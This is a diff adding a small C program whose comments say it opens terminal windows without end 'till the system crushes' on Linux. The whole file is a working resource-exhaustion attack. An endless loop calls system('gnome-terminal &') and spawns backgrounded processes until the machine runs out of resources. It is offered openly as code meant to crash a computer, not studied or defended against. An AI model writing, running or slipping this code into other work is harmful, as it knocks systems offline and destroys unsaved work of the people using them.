@@ -1,0 +1,11 @@
+// Opens an infinite number of terminal windows till the system crushes.
+// Works on Linux OS only.
+
+#include <stdlib.h>
+
+int main() {
+  while(1) {  // Infinite loop
+    system("gnome-terminal &");  // Execute the command to open a new terminal window
+  }
+  return 0;
+}
